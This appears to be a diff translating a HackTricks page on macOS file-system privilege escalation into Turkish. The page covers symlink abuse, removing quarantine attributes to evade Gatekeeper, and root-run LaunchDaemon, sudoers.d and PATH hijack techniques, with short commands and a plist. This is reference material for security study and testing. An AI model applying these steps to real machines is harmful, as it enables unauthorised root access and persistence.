@@ -2,74 +2,69 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## POSIX permissions combinations
+## POSIX izin kombinasyonları
 
-Permissions in a **directory**:
+Bir **dizindeki** izinler:
 
-- **read** - you can **enumerate** the directory entries
-- **write** - you can **delete/write** **files** in the directory and you can **delete empty folders**.
-  - But you **cannot delete/modify non-empty folders** unless you have write permissions over it.
-  - You **cannot modify the name of a folder** unless you own it.
-- **execute** - you are **allowed to traverse** the directory - if you don’t have this right, you can’t access any files inside it, or in any subdirectories.
+- **okuma** - dizin girişlerini **sıralayabilirsiniz**
+- **yazma** - dizindeki **dosyaları silip/yazabilirsiniz** ve **boş klasörleri** silebilirsiniz.
+- Ancak **boş olmayan klasörleri** silip/değiştiremezsiniz, eğer üzerinde yazma izniniz yoksa.
+- Bir klasörün adını **değiştiremezsiniz** eğer ona sahip değilseniz.
+- **çalıştırma** - dizinde **gezinmenize izin verilir** - bu hakka sahip değilseniz, içindeki dosyalara veya alt dizinlerdeki dosyalara erişemezsiniz.
 
-### Dangerous Combinations
+### Tehlikeli Kombinasyonlar
 
-**How to overwrite a file/folder owned by root**, but:
+**Root tarafından sahip olunan bir dosya/klasörü nasıl geçersiz kılabilirsiniz**, ancak:
 
-- One parent **directory owner** in the path is the user
-- One parent **directory owner** in the path is a **users group** with **write access**
-- A users **group** has **write** access to the **file**
+- Yolda bir ana **dizin sahibi** kullanıcıdır
+- Yolda bir ana **dizin sahibi** **kullanıcı grubu** **yazma erişimine** sahiptir
+- Bir kullanıcı **grubu** **dosyaya** **yazma** erişimine sahiptir
 
-With any of the previous combinations, an attacker could **inject** a **sym/hard link** the expected path to obtain a privileged arbitrary write.
+Önceki kombinasyonlardan herhangi biriyle, bir saldırgan **beklenen yola** bir **simetrik/sert bağlantı** **enjekte** edebilir ve ayrıcalıklı bir yazma elde edebilir.
 
-### Folder root R+X Special case
+### Klasör root R+X Özel durumu
 
-If there are files in a **directory** where **only root has R+X access**, those are **not accessible to anyone else**. So a vulnerability allowing to **move a file readable by a user**, that cannot be read because of that **restriction**, from this folder **to a different one**, could be abuse to read these files.
+Eğer **yalnızca root'un R+X erişimine sahip olduğu** bir **dizide** dosyalar varsa, bu dosyalar **başka kimseye erişilebilir değildir**. Bu nedenle, bir kullanıcının **okuyabileceği** bir dosyayı, bu **kısıtlama** nedeniyle okunamayan bir klasörden **farklı birine** **taşıma** izni veren bir güvenlik açığı, bu dosyaları okumak için kötüye kullanılabilir.
 
-Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)
+Örnek: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)
 
-## Symbolic Link / Hard Link
+## Sembolik Bağlantı / Sert Bağlantı
 
-If a privileged process is writing data in **file** that could be **controlled** by a **lower privileged user**, or that could be **previously created** by a lower privileged user. The user could just **point it to another file** via a Symbolic or Hard link, and the privileged process will write on that file.
+Eğer ayrıcalıklı bir işlem, **düşük ayrıcalıklı bir kullanıcı** tarafından **kontrol edilebilecek** veya daha önce düşük ayrıcalıklı bir kullanıcı tarafından **oluşturulmuş** bir **dosyaya** veri yazıyorsa. Kullanıcı, sadece bir Sembolik veya Sert bağlantı aracılığıyla onu **başka bir dosyaya** **işaret edebilir** ve ayrıcalıklı işlem o dosyaya yazacaktır.
 
-Check in the other sections where an attacker could **abuse an arbitrary write to escalate privileges**.
+Bir saldırganın **ayrıcalıkları artırmak için keyfi bir yazmayı nasıl kötüye kullanabileceğini** kontrol edin.
 
 ## .fileloc
 
-Files with **`.fileloc`** extension can point to other applications or binaries so when they are open, the application/binary will be the one executed.\
-Example:
-
+**`.fileloc`** uzantısına sahip dosyalar, diğer uygulamalara veya ikili dosyalara işaret edebilir, böylece açıldıklarında, uygulama/ikili dosya çalıştırılacaktır.\
+Örnek:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>URL</key>
-    <string>file:///System/Applications/Calculator.app</string>
-    <key>URLPrefix</key>
-    <integer>0</integer>
+<key>URL</key>
+<string>file:///System/Applications/Calculator.app</string>
+<key>URLPrefix</key>
+<integer>0</integer>
 </dict>
 </plist>
 ```
+## Keyfi FD
 
-## Arbitrary FD
+Eğer bir **işlemi yüksek ayrıcalıklarla bir dosya veya klasör açmaya zorlayabilirseniz**, **`crontab`**'i kullanarak `/etc/sudoers.d` içindeki bir dosyayı **`EDITOR=exploit.py`** ile açabilirsiniz, böylece `exploit.py` `/etc/sudoers` içindeki dosyaya FD alacak ve bunu kötüye kullanacaktır.
 
-If you can make a **process open a file or a folder with high privileges**, you can abuse **`crontab`** to open a file in `/etc/sudoers.d` with **`EDITOR=exploit.py`**, so the `exploit.py` will get the FD to the file inside `/etc/sudoers` and abuse it.
+Örneğin: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
 
-For example: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
+## Karantina xattrs hilelerinden kaçının
 
-## Avoid quarantine xattrs tricks
-
-### Remove it
-
+### Kaldırın
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
+### uchg / uchange / uimmutable bayrağı
 
-### uchg / uchange / uimmutable flag
-
-If a file/folder has this immutable attribute it won't be possible to put an xattr on it
-
+Eğer bir dosya/klasör bu değişmez niteliğe sahipse, ona bir xattr eklemek mümkün olmayacaktır.
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -79,11 +74,9 @@ xattr: [Errno 1] Operation not permitted: '/tmp/asd'
 ls -lO /tmp/asd
 # check the "uchg" in the output
 ```
-
 ### defvfs mount
 
-A **devfs** mount **doesn't support xattr**, more info in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
-
+Bir **devfs** montajı **xattr** desteklemez, daha fazla bilgi için [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
 ```bash
 mkdir /tmp/mnt
 mount_devfs -o noowners none "/tmp/mnt"
@@ -92,11 +85,9 @@ mkdir /tmp/mnt/lol
 xattr -w com.apple.quarantine "" /tmp/mnt/lol
 xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
 ```
-
 ### writeextattr ACL
 
-This ACL prevents from adding `xattrs` to the file
-
+Bu ACL, dosyaya `xattrs` eklenmesini engeller.
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -117,17 +108,15 @@ open test.zip
 sleep 1
 ls -le /tmp/test
 ```
-
 ### **com.apple.acl.text xattr + AppleDouble**
 
-**AppleDouble** file format copies a file including its ACEs.
+**AppleDouble** dosya formatı, bir dosyayı ACE'leri ile birlikte kopyalar.
 
-In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`** is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:
+[**kaynak kodda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) görülebilir ki, xattr içinde saklanan ACL metin temsili **`com.apple.acl.text`** olarak adlandırılır ve bu, sıkıştırılmamış dosyada ACL olarak ayarlanacaktır. Yani, bir uygulamayı ACL'nin diğer xattr'lerin yazılmasını engellediği **AppleDouble** dosya formatında bir zip dosyasına sıkıştırdıysanız... karantina xattr uygulamaya ayarlanmamıştı:
 
-Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.
+Daha fazla bilgi için [**orijinal raporu**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kontrol edin.
 
-To replicate this we first need to get the correct acl string:
-
+Bunu tekrarlamak için önce doğru acl dizesini almamız gerekiyor:
 ```bash
 # Everything will be happening here
 mkdir /tmp/temp_xattrs
@@ -145,75 +134,69 @@ ditto -c -k del test.zip
 ditto -x -k --rsrc test.zip .
 ls -le test
 ```
+(Not edin ki bu işe yarasa bile, sandbox öncelikle karantina xattr'ı yazar)
 
-(Note that even if this works the sandbox write the quarantine xattr before)
-
-Not really needed but I leave it there just in case:
+Gerçekten gerekli değil ama yine de burada bırakıyorum:
 
 {{#ref}}
 macos-xattr-acls-extra-stuff.md
 {{#endref}}
 
-## Bypass Code Signatures
+## Kod İmzalarını Atlatma
 
-Bundles contains the file **`_CodeSignature/CodeResources`** which contains the **hash** of every single **file** in the **bundle**. Note that the hash of CodeResources is also **embedded in the executable**, so we can't mess with that, either.
+Bundle'lar, **bundle** içindeki her bir **dosya**nın **hash**'ini içeren **`_CodeSignature/CodeResources`** dosyasını içerir. CodeResources'ın hash'inin de **çalıştırılabilir dosya**ya **gömülü** olduğunu unutmayın, bu yüzden bununla da oynayamayız.
 
-However, there are some files whose signature won't be checked, these have the key omit in the plist, like:
-
+Ancak, imzasının kontrol edilmeyeceği bazı dosyalar vardır, bunlar plist'te omit anahtarına sahiptir, örneğin:
 ```xml
 <dict>
 ...
-	<key>rules</key>
-	<dict>
+<key>rules</key>
+<dict>
 ...
-		<key>^Resources/.*\.lproj/locversion.plist$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>1100</real>
-		</dict>
+<key>^Resources/.*\.lproj/locversion.plist$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>1100</real>
+</dict>
 ...
-	</dict>
-	<key>rules2</key>
+</dict>
+<key>rules2</key>
 ...
-		<key>^(.*/)?\.DS_Store$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>2000</real>
-		</dict>
+<key>^(.*/)?\.DS_Store$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>2000</real>
+</dict>
 ...
-		<key>^PkgInfo$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>20</real>
-		</dict>
+<key>^PkgInfo$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>20</real>
+</dict>
 ...
-		<key>^Resources/.*\.lproj/locversion.plist$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>1100</real>
-		</dict>
+<key>^Resources/.*\.lproj/locversion.plist$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>1100</real>
+</dict>
 ...
 </dict>
 ```
-
-It's possible to calculate the signature of a resource from the cli with:
-
+CLI'den bir kaynağın imzasını hesaplamak mümkündür:
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
 ```
+## DMG'leri Bağla
 
-## Mount dmgs
-
-A user can mount a custom dmg created even on top of some existing folders. This is how you could create a custom dmg package with custom content:
-
+Bir kullanıcı, mevcut bazı klasörlerin üzerine bile oluşturulmuş özel bir dmg'yi bağlayabilir. Özel içerikle bir özel dmg paketi oluşturmanın yolu budur:
 ```bash
 # Create the volume
 hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
@@ -234,55 +217,51 @@ hdiutil detach /private/tmp/mnt 1>/dev/null
 # You can also create a dmg from an app using:
 hdiutil create -srcfolder justsome.app justsome.dmg
 ```
+Genellikle macOS, diski `/usr/libexec/diskarbitrationd` tarafından sağlanan `com.apple.DiskArbitrarion.diskarbitrariond` Mach servisi ile bağlar. LaunchDaemons plist dosyasına `-d` parametresi eklenip yeniden başlatıldığında, `/var/log/diskarbitrationd.log` dosyasına günlükler kaydedilecektir.\
+Ancak, `com.apple.driver.DiskImages` kext'i ile doğrudan iletişim kurmak için `hdik` ve `hdiutil` gibi araçlar kullanmak mümkündür.
 
-Usually macOS mounts disk talking to the `com.apple.DiskArbitrarion.diskarbitrariond` Mach service (provided by `/usr/libexec/diskarbitrationd`). If adding the param `-d` to the LaunchDaemons plist file and restarted, it will store logs it will store logs in `/var/log/diskarbitrationd.log`.\
-However, it's possible to use tools like `hdik` and `hdiutil` to communicate directly with the `com.apple.driver.DiskImages` kext.
+## Keyfi Yazmalar
 
-## Arbitrary Writes
+### Periyodik sh betikleri
 
-### Periodic sh scripts
+Eğer betiğiniz bir **shell script** olarak yorumlanabiliyorsa, her gün tetiklenecek olan **`/etc/periodic/daily/999.local`** shell betiğini üzerine yazabilirsiniz.
 
-If your script could be interpreted as a **shell script** you could overwrite the **`/etc/periodic/daily/999.local`** shell script that will be triggered every day.
+Bu betiğin bir yürütmesini **`sudo periodic daily`** ile **sahte** yapabilirsiniz.
 
-You can **fake** an execution of this script with: **`sudo periodic daily`**
+### Daemonlar
 
-### Daemons
-
-Write an arbitrary **LaunchDaemon** like **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** with a plist executing an arbitrary script like:
-
+Keyfi bir **LaunchDaemon** yazın, örneğin **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** gibi, keyfi bir betiği yürüten bir plist ile:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
-    <dict>
-        <key>Label</key>
-        <string>com.sample.Load</string>
-        <key>ProgramArguments</key>
-        <array>
-            <string>/Applications/Scripts/privesc.sh</string>
-        </array>
-        <key>RunAtLoad</key>
-        <true/>
-    </dict>
+<dict>
+<key>Label</key>
+<string>com.sample.Load</string>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Scripts/privesc.sh</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
+</dict>
 </plist>
 ```
+Sadece kök olarak çalıştırmak istediğiniz **komutları** içeren `/Applications/Scripts/privesc.sh` dosyasını oluşturun.
 
-Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.
+### Sudoers Dosyası
 
-### Sudoers File
+Eğer **keyfi yazma** yetkiniz varsa, kendinize **sudo** ayrıcalıkları veren bir dosya oluşturabilirsiniz **`/etc/sudoers.d/`** klasörü içinde.
 
-If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.
+### PATH dosyaları
 
-### PATH files
+**`/etc/paths`** dosyası, PATH env değişkenini dolduran ana yerlerden biridir. Üzerine yazmak için kök olmalısınız, ancak eğer **yetkili bir işlem** bir **komutu tam yol olmadan** çalıştırıyorsa, bu dosyayı değiştirerek onu **ele geçirme** şansınız olabilir.
 
-The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.
+Ayrıca `PATH` env değişkenine yeni klasörler yüklemek için **`/etc/paths.d`** içinde dosyalar yazabilirsiniz.
 
-You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.
+## Diğer kullanıcılar olarak yazılabilir dosyalar oluşturma
 
-## Generate writable files as other users
-
-This will generate a file that belongs to root that is writable by me ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). This might also work as privesc:
-
+Bu, bana yazılabilir olan kök ait bir dosya oluşturacaktır ([**buradan kod**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Bu aynı zamanda privesc olarak da çalışabilir:
 ```bash
 DIRNAME=/usr/local/etc/periodic/daily
 
@@ -294,15 +273,13 @@ MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDont
 FILENAME=$(ls "$DIRNAME")
 echo $FILENAME
 ```
+## POSIX Paylaşılan Bellek
 
-## POSIX Shared Memory
-
-**POSIX shared memory** allows processes in POSIX-compliant operating systems to access a common memory area, facilitating faster communication compared to other inter-process communication methods. It involves creating or opening a shared memory object with `shm_open()`, setting its size with `ftruncate()`, and mapping it into the process's address space using `mmap()`. Processes can then directly read from and write to this memory area. To manage concurrent access and prevent data corruption, synchronization mechanisms such as mutexes or semaphores are often used. Finally, processes unmap and close the shared memory with `munmap()` and `close()`, and optionally remove the memory object with `shm_unlink()`. This system is especially effective for efficient, fast IPC in environments where multiple processes need to access shared data rapidly.
+**POSIX paylaşılan bellek**, POSIX uyumlu işletim sistemlerinde süreçlerin ortak bir bellek alanına erişmesine olanak tanır ve bu, diğer süreçler arası iletişim yöntemlerine kıyasla daha hızlı iletişim sağlar. Bu, `shm_open()` ile bir paylaşılan bellek nesnesi oluşturmayı veya açmayı, `ftruncate()` ile boyutunu ayarlamayı ve `mmap()` kullanarak sürecin adres alanına haritalamayı içerir. Süreçler daha sonra bu bellek alanından doğrudan okuma ve yazma yapabilirler. Eşzamanlı erişimi yönetmek ve veri bozulmasını önlemek için genellikle mutexler veya semaforlar gibi senkronizasyon mekanizmaları kullanılır. Son olarak, süreçler paylaşılan belleği `munmap()` ve `close()` ile haritalamayı kaldırır ve kapatır, isteğe bağlı olarak bellek nesnesini `shm_unlink()` ile kaldırabilirler. Bu sistem, birden fazla sürecin paylaşılan verilere hızlı bir şekilde erişmesi gereken ortamlarda verimli, hızlı IPC için özellikle etkilidir.
 
 <details>
 
-<summary>Producer Code Example</summary>
-
+<summary>Üretici Kod Örneği</summary>
 ```c
 // gcc producer.c -o producer -lrt
 #include <fcntl.h>
@@ -313,46 +290,44 @@ echo $FILENAME
 #include <stdlib.h>
 
 int main() {
-    const char *name = "/my_shared_memory";
-    const int SIZE = 4096; // Size of the shared memory object
+const char *name = "/my_shared_memory";
+const int SIZE = 4096; // Size of the shared memory object
 
-    // Create the shared memory object
-    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
-    if (shm_fd == -1) {
-        perror("shm_open");
-        return EXIT_FAILURE;
-    }
+// Create the shared memory object
+int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
+if (shm_fd == -1) {
+perror("shm_open");
+return EXIT_FAILURE;
+}
 
-    // Configure the size of the shared memory object
-    if (ftruncate(shm_fd, SIZE) == -1) {
-        perror("ftruncate");
-        return EXIT_FAILURE;
-    }
+// Configure the size of the shared memory object
+if (ftruncate(shm_fd, SIZE) == -1) {
+perror("ftruncate");
+return EXIT_FAILURE;
+}
 
-    // Memory map the shared memory
-    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
-    if (ptr == MAP_FAILED) {
-        perror("mmap");
-        return EXIT_FAILURE;
-    }
+// Memory map the shared memory
+void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
+if (ptr == MAP_FAILED) {
+perror("mmap");
+return EXIT_FAILURE;
+}
 
-    // Write to the shared memory
-    sprintf(ptr, "Hello from Producer!");
+// Write to the shared memory
+sprintf(ptr, "Hello from Producer!");
 
-    // Unmap and close, but do not unlink
-    munmap(ptr, SIZE);
-    close(shm_fd);
+// Unmap and close, but do not unlink
+munmap(ptr, SIZE);
+close(shm_fd);
 
-    return 0;
+return 0;
 }
 ```
-
 </details>
 
 <details>
 
-<summary>Consumer Code Example</summary>
-
+<summary>Tüketici Kod Örneği</summary>
 ```c
 // gcc consumer.c -o consumer -lrt
 #include <fcntl.h>
@@ -363,51 +338,49 @@ int main() {
 #include <stdlib.h>
 
 int main() {
-    const char *name = "/my_shared_memory";
-    const int SIZE = 4096; // Size of the shared memory object
+const char *name = "/my_shared_memory";
+const int SIZE = 4096; // Size of the shared memory object
 
-    // Open the shared memory object
-    int shm_fd = shm_open(name, O_RDONLY, 0666);
-    if (shm_fd == -1) {
-        perror("shm_open");
-        return EXIT_FAILURE;
-    }
+// Open the shared memory object
+int shm_fd = shm_open(name, O_RDONLY, 0666);
+if (shm_fd == -1) {
+perror("shm_open");
+return EXIT_FAILURE;
+}
 
-    // Memory map the shared memory
-    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
-    if (ptr == MAP_FAILED) {
-        perror("mmap");
-        return EXIT_FAILURE;
-    }
+// Memory map the shared memory
+void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
+if (ptr == MAP_FAILED) {
+perror("mmap");
+return EXIT_FAILURE;
+}
 
-    // Read from the shared memory
-    printf("Consumer received: %s\n", (char *)ptr);
+// Read from the shared memory
+printf("Consumer received: %s\n", (char *)ptr);
 
-    // Cleanup
-    munmap(ptr, SIZE);
-    close(shm_fd);
-    shm_unlink(name); // Optionally unlink
+// Cleanup
+munmap(ptr, SIZE);
+close(shm_fd);
+shm_unlink(name); // Optionally unlink
 
-    return 0;
+return 0;
 }
 
 ```
-
 </details>
 
-## macOS Guarded Descriptors
+## macOS Korunan Tanımlayıcılar
 
-**macOSCguarded descriptors** are a security feature introduced in macOS to enhance the safety and reliability of **file descriptor operations** in user applications. These guarded descriptors provide a way to associate specific restrictions or "guards" with file descriptors, which are enforced by the kernel.
+**macOS korunan tanımlayıcılar**, kullanıcı uygulamalarındaki **dosya tanımlayıcı işlemlerinin** güvenliğini ve güvenilirliğini artırmak için macOS'ta tanıtılan bir güvenlik özelliğidir. Bu korunan tanımlayıcılar, dosya tanımlayıcılarıyla belirli kısıtlamalar veya "korumalar" ilişkilendirme yolu sağlar ve bu kısıtlamalar çekirdek tarafından uygulanır.
 
-This feature is particularly useful for preventing certain classes of security vulnerabilities such as **unauthorized file access** or **race conditions**. These vulnerabilities occurs when for example a thread is accessing a file description giving **another vulnerable thread access over it** or when a file descriptor is **inherited** by a vulnerable child process. Some functions related to this functionality are:
+Bu özellik, **yetkisiz dosya erişimi** veya **yarış koşulları** gibi belirli güvenlik açıklarını önlemek için özellikle yararlıdır. Bu güvenlik açıkları, örneğin bir iş parçacığı bir dosya tanımına erişirken **başka bir savunmasız iş parçacığının buna erişim sağlaması** veya bir dosya tanımlayıcısının **savunmasız bir çocuk süreç tarafından devralınması** durumunda ortaya çıkar. Bu işlevsellikle ilgili bazı fonksiyonlar şunlardır:
 
-- `guarded_open_np`: Opend a FD with a guard
-- `guarded_close_np`: Close it
-- `change_fdguard_np`: Change guard flags on a descriptor (even removing the guard protection)
+- `guarded_open_np`: Bir koruma ile FD açar
+- `guarded_close_np`: Kapatır
+- `change_fdguard_np`: Bir tanımlayıcı üzerindeki koruma bayraklarını değiştirir (hatta koruma kaldırılabilir)
 
-## References
+## Referanslar
 
 - [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
 
 {{#include ../../../../banners/hacktricks-training.md}}
-
